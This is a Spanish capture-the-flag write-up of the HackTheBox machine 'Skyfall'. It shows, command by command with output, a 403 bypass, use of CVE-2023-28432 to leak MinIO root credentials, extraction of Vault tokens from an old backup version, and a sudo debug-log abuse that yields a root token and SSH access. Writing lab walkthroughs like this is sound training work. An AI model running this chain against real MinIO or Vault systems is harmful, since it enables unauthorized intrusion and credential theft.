

![1](</Writeups/Maquinas/Skyfall/img/logo.png>)
By Rug4lo

## Reconocimiento 

Vamos a empezar escaneando los puertos con nmap
```bash
❯ sudo nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.254

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 18:27 CEST
Initiating SYN Stealth Scan at 18:27
Scanning 10.10.11.254 [65535 ports]
Discovered open port 22/tcp on 10.10.11.254
Discovered open port 80/tcp on 10.10.11.254
Completed SYN Stealth Scan at 18:27, 11.29s elapsed (65535 total ports)
Nmap scan report for 10.10.11.254
Host is up, received user-set (0.041s latency).
Scanned at 2024-05-26 18:27:30 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
           Raw packets sent: 65620 (2.887MB) | Rcvd: 65535 (2.621MB)
```
Podemos ver que tiene una pagina web, si investigamos veremos que tiene un subdominio llamado `http://demo.skyfall.htb/`

![1](</Writeups/Maquinas/Skyfall/img/1.png>)

Podemos probar credenciales, hasta que entramos como guest:guest

![1](</Writeups/Maquinas/Skyfall/img/2.png>)

En este dashboard tenemos varios vectores de ataque potenciales, pero una cosa que me llamo la atención fue el que el apartado Metrics me daba un error `403 Forbidden`

Hay una herramienta que nos permite bypassear este error

nomore403 --> https://github.com/devploit/nomore403

Ejecutamos la herramienta y veremos una manera de bypassear este error
```bash
❯ ./nomore403 -u http://demo.skyfall.htb/metrics -H 'Cookie: session=.eJwljrtuwzAMAP9FcwaRFEkrP2NQfKBFgBawkynIv9dAb7ub7t32OvL8avfn8cpb27-j3ds0R3blrsDdswMtGUMZuxcVdlIVrgDcZDNeuHyGqeWa7kgjAtiAiFJ0hYBlMW2QvQr6GjhzEeAszQse0DmsEkvGrMBR0q6R15nH_w1c6udR-_P3kT9XIKwO6G4CYEgaCAy5LGPCHIVLt5Liap8_0xk_uA.ZlIQ0A.ScXfYx4HMIygXnSRO9SteF4gEv8' | grep -vE "403"

    ________  ________  ________  ________  ________  ________  ________  ________  ________
   ╱     ╱  ╲╱        ╲╱    ╱   ╲╱        ╲╱        ╲╱        ╲╱    ╱   ╲╱        ╲╱__      ╲
  ╱         ╱    ╱    ╱         ╱    ╱    ╱    ╱    ╱       __╱         ╱    ╱    ╱__       ╱
 ╱         ╱         ╱         ╱         ╱        _╱       __/____     ╱         ╱         ╱
 ╲__╱_____╱╲________╱╲__╱__╱__╱╲________╱╲____╱___╱╲________╱    ╱____╱╲________╱╲________╱                                   
	
Target: 		http://demo.skyfall.htb/metrics
Headers: 		{Cookie  session=.eJwljrtuwzAMAP9FcwaRFEkrP2NQfKBFgBawkynIv9dAb7ub7t32OvL8avfn8cpb27-j3ds0R3blrsDdswMtGUMZuxcVdlIVrgDcZDNeuHyGqeWa7kgjAtiAiFJ0hYBlMW2QvQr6GjhzEeAszQse0DmsEkvGrMBR0q6R15nH_w1c6udR-_P3kT9XIKwO6G4CYEgaCAy5LGPCHIVLt5Liap8_0xk_uA.ZlIQ0A.ScXfYx4HMIygXnSRO9SteF4gEv8}
Proxy: 			false
Method: 		GET
Payloads folder: 	payloads
Custom bypass IP: 	false
Follow Redirects: 	false
Rate Limit detection: 	false
Timeout (ms): 		6000
Delay (ms): 		0
Techniques: 		verbs, verbs-case, headers, endpaths, midpaths, http-versions, path-case
Verbose: 		false

━━━━━━━━━━━━━━━ VERB TAMPERING ━━━━━━━━━━━━━━━
405 	          327 bytes TRACE

━━━━━━━ VERB TAMPERING CASE SWITCHING ━━━━━━━━

━━━━━━━━━━━━━━━━━━ HEADERS ━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━ CUSTOM PATHS ━━━━━━━━━━━━━━━━━
500 	          854 bytes http://demo.skyfall.htb/metrics.html
200 	        45354 bytes http://demo.skyfall.htb/metrics%0A
302 	          428 bytes http://demo.skyfall.htb/#?metrics
302 	          428 bytes http://demo.skyfall.htb/#metrics
302 	          428 bytes http://demo.skyfall.htb///?anythingmetrics
302 	          428 bytes http://demo.skyfall.htb/??metrics
302 	          428 bytes http://demo.skyfall.htb/?metrics
302 	          428 bytes http://demo.skyfall.htb/???metrics

━━━━━━━━━━━━━━━ HTTP VERSIONS ━━━━━━━━━━━━━━━━

━━━━━━━━━━━━ PATH CASE SWITCHING ━━━━━━━━━━━━━
```
Si entramos seremos capaces de acceder 

![1](</Writeups/Maquinas/Skyfall/img/3.png>)

En estas métricas veremos algo interesante, un subdominio de lo que parece un servicio cloud de minio

![1](</Writeups/Maquinas/Skyfall/img/4.png>)

Si investigamos podremos ver un CVE de este servicio, que nos explica que podemos ver información sensible en este endpoint `/minio/bootstrap/v1/verify`

CVE --> https://github.com/Mr-xn/CVE-2023-28432

![1](</Writeups/Maquinas/Skyfall/img/5.png>)

Con esto tenemos el usuario y contraseña de MINIO_ROOT, y podemos probar a conectarnos con la herramienta de terminal de MINIO

Crearemos una instancia con las credenciales que tenemos
```bash
❯ ./mc alias set minio http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
```
Con esto podemos listar la información y ver que el usuario askyy tiene un backup de su Home
```bash
❯ /opt/mc ls -r mycloud

[2023-11-08 06:35:28 CET]  48KiB STANDARD askyy/Welcome.pdf
[2023-11-09 22:37:25 CET] 2.5KiB STANDARD askyy/home_backup.tar.gz
[2023-11-08 06:35:36 CET]  48KiB STANDARD btanner/Welcome.pdf
[2023-11-08 06:35:56 CET]  48KiB STANDARD emoneypenny/Welcome.pdf
[2023-11-08 06:36:02 CET]  48KiB STANDARD gmallory/Welcome.pdf
[2023-11-08 01:08:05 CET]  48KiB STANDARD guest/Welcome.pdf
[2023-11-08 06:35:45 CET]  48KiB STANDARD jbond/Welcome.pdf
[2023-11-08 06:36:09 CET]  48KiB STANDARD omansfield/Welcome.pdf
[2023-11-08 06:35:51 CET]  48KiB STANDARD rsilva/Welcome.pdf
```
Si te lo descargas veras que no contiene nada, pero si investigas mas veras que en estos backups hay versiones (similares a los comits de github) y se pueden listar
```bash
❯ /opt/mc ls -r --versions mycloud

[2023-11-08 05:59:15 CET]     0B askyy/
[2023-11-08 06:35:28 CET]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-09 22:37:25 CET] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-09 22:37:09 CET] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-09 22:36:30 CET] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-08 05:58:56 CET]     0B btanner/
[2023-11-08 06:35:36 CET]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-08 05:58:33 CET]     0B emoneypenny/
[2023-11-08 06:35:56 CET]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-08 05:58:22 CET]     0B gmallory/
[2023-11-08 06:36:02 CET]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-08 01:08:01 CET]     0B guest/
[2023-11-08 01:08:05 CET]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-08 05:59:05 CET]     0B jbond/
[2023-11-08 06:35:45 CET]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-08 05:58:10 CET]     0B omansfield/
[2023-11-08 06:36:09 CET]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-08 05:58:45 CET]     0B rsilva/
[2023-11-08 06:35:51 CET]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
```
Podemos ver que la v1 pesa mucho mas que los demás, si nos los descargamos este backup veremos que tiene una id_rsa, pero si la probamos nos daremos cuenta de que no nos sirve, ya que es una version antigua

Por lo cual solo nos queda la v2, que al descargarla aparentemente estará todo igual que la v3
```bash
❯ /opt/mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 mycloud/askyy/home_backup.tar.gz ./home_backup.tar.gz
```
Pero si prestamos atención al archivo .bashrc veremos que tiene unos tokens de vault y un nuevo subdominio

![1](</Writeups/Maquinas/Skyfall/img/6.png>)

Agregamos este nuevo subdominio y buscamos información de las vaults, y encontramos que hay un comando para logearnos con el token, primero ponemos las variables de entorno
```bash
export VAULT_ADDR=http://prd23-vault-internal.skyfall.htb
export VAULT_TOKEN=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
Ahora probamos a logearnos 
```bash
❯ vault login

Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       433228h5m16s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```
Perfecto, ahora podemos listar los roles de ssh para posteriormente conectarnos con estos
```bash
❯ vault list ssh/roles

Keys
----
admin_otp_key_role
dev_otp_key_role
```
Nos conectamos usando el rol de `dev_otp_key_role` y el usuario askyy
```bash
❯ vault ssh -mode=otp -role=dev_otp_key_role -strict-host-key-checking=no askyy@10.10.11.254

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 26 14:48:26 2024 from 10.10.14.22
askyy@skyfall:~$ 
```
Con esto nos podemos ver la user y empezar la escalada de privilegios

Primero miraremos si tenemos permiso para ejecutar algún comando como root
```bash
❯ sudo -l

Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```
Podemos ver que tenemos capacidad de ejecutar como root el binario `/root/vault/vault-unseal -c /etc/vault-unseal.yaml` y usar cualquiera de los argumentos 

Viendo eso le haremos un -h y veremos que el debug crea un archivo llamado debug.log
```bash
❯ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h

Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```
Podemos ejecutar el comando con el -d y leer el debug.log, donde tendremos una token
```bash
❯ cat debug.log
......
2024/02/06 12:32:21 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
......
```
Podemos conectarnos como root con este nuevo token de la misma manera que hicimos con el user, pero con el rol de admin
```bash
❯ export VAULT_TOKEN=hvs.I0ewVsmaKU1SwVZAKR3T0mmG
```
```bash
❯ vault ssh -mode=otp -role=admin_otp_key_role -strict-host-key-checking=no root@10.10.11.254

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 26 16:18:43 2024 from 10.10.14.22
root@skyfall:~# 
```
Con esto podemos leer la flag y listo